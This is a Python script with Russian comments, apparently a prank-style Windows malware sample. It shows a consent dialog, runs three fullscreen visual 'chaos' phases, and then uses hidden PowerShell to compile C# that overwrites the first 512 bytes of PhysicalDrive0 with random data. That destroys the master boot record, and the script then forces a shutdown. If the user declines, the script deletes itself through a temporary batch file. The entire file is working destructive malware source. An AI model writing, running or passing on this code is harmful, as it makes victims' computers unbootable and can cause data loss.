import os
import sys
import time
import ctypes
import random
import threading
import subprocess
import tkinter as tk
from tkinter import messagebox

# ==========================================
# ЧАСТЬ 1: ПРЕДУПРЕЖДЕНИЕ И ВЫБОР
# ==========================================

def show_warning():
    root = tk.Tk()
    root.withdraw() # Скрываем основное окно
    root.attributes("-topmost", True)
    
    # Показываем окно с кнопками OK и Cancel
    result = messagebox.askokcancel(
        "SYSTEM WARNING", 
        "WARNING: This program will cause chaos on your system. \n\nClick OK to proceed, or Cancel to delete yourself."
    )
    
    if result:
        root.destroy()
        return True # Пользователь нажал OK
    else:
        root.destroy()
        return False # Пользователь нажал Cancel

# ==========================================
# ЧАСТЬ 2: САМОУНИЧТОЖЕНИЕ
# ==========================================

def self_destruct():
    # Скрипт удаляет сам себя
    try:
        # Получаем путь к текущему исполняемому файлу
        if getattr(sys, 'frozen', False):
            path = sys.executable
        else:
            path = os.path.abspath(__file__)
            
        # Создаем батник, который удалит наш файл после выхода
        batch_path = os.path.join(os.getenv("TEMP"), "delete_me.bat")
        with open(batch_path, "w") as f:
            f.write(f"@echo off\n")
            f.write(f"timeout /t 2 >nul\n")
            f.write(f"del /f /q \"{path}\"\n")
            f.write(f"del /f /q \"{batch_path}\"\n")
        
        # Запускаем батник и выходим
        subprocess.Popen(batch_path, shell=True)
        sys.exit(0)
    except:
        sys.exit(0)

# ==========================================
# ЧАСТЬ 3: ТАЙМЛАЙН ХАОСА
# ==========================================

# Фаза 1: Переливание рабочего стола (0-30 сек)
def phase_1_color_flash():
    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF"]
    start_time = time.time()
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")
    
    while time.time() - start_time < 30:
        color = random.choice(colors)
        root.configure(bg=color)
        root.update()
        time.sleep(0.1) # Меняем цвет 10 раз в секунду
        
    root.destroy()

# Фаза 2: Ядовитые квадраты (30-60 сек)
def phase_2_toxic_squares():
    start_time = time.time()
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")
    
    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
    canvas.pack()
    
    while time.time() - start_time < 30:
        for _ in range(20):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            size = random.randint(20, 150)
            color = random.choice(["#00FF00", "#FF00FF", "#00FFFF", "#FFFF00"])
            canvas.create_rectangle(x, y, x+size, y+size, fill=color, outline="")
        root.update()
        time.sleep(0.05)
        
    root.destroy()

# Фаза 3: Страшные лица (60-90 сек)
def phase_3_scary_faces():
    start_time = time.time()
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")
    
    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
    canvas.pack()
    
    while time.time() - start_time < 30:
        canvas.delete("all")
        # Рисуем "лицо" из символов
        w = root.winfo_screenwidth()
        h = root.winfo_screenheight()
        
        # Глаза
        canvas.create_oval(w//2 - 200, h//2 - 200, w//2 - 50, h//2 - 50, fill="red", outline="white", width=5)
        canvas.create_oval(w//2 + 50, h//2 - 200, w//2 + 200, h//2 - 50, fill="red", outline="white", width=5)
        # Зрачки
        canvas.create_oval(w//2 - 150, h//2 - 150, w//2 - 100, h//2 - 100, fill="black")
        canvas.create_oval(w//2 + 100, h//2 - 150, w//2 + 150, h//2 - 100, fill="black")
        
        # Рот (кривая линия)
        canvas.create_line(w//2 - 150, h//2 + 150, w//2, h//2 + 250, w//2 + 150, h//2 + 150, fill="white", width=10, smooth=True)
        
        root.update()
        time.sleep(0.5) # Меняем каждые полсекунды
        
    root.destroy()

# ==========================================
# ЧАСТЬ 4: СНОС MBR (BOOTKIT)
# ==========================================

def destroy_mbr():
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    # 1. Показываем предупреждение
    if not show_warning():
        self_destruct()
        return
        
    # 2. Если нажали OK, запускаем ад
    # Запускаем таймлайн в отдельных потоках (чтобы не блокировать друг друга)
    phase_1_color_flash() # 30 секунд
    phase_2_toxic_squares() # 30 секунд
    phase_3_scary_faces() # 30 секунд
    
    # 3. Финал: снос загрузчика и выключение
    destroy_mbr()
    os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    main()
